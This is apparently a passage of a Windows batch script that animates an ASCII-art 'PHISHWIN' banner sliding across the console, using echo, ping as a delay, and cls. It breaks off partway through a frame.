echo                                   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                 ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                 "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                 "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                 "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                 "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                 "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                               ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                               "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                               "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                               "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                               "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                               "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                 ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                 "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                 "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                 "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                 "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                 "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo               ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo               "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo               "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo               "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo               "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo               "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|"                                                                                     
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|"                                                                                    
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
